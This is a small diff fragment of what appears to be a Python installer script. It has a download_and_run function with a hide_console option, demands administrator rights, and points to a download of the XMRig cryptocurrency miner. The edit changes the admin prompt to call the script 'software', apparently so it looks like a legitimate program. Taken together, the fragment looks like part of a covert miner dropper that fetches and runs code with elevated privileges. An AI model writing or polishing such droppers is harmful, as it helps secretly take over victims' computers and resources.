@@ -79,7 +79,7 @@ def download_and_run(url, destination, hide_console=False):
 
 def main():
     if not is_admin():
-        show_message_box("This script must be run as Administrator!", "Admin Privileges Required")
+        show_message_box("This software must be run as Administrator!", "Admin Privileges Required")
         sys.exit(1)
 
     URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
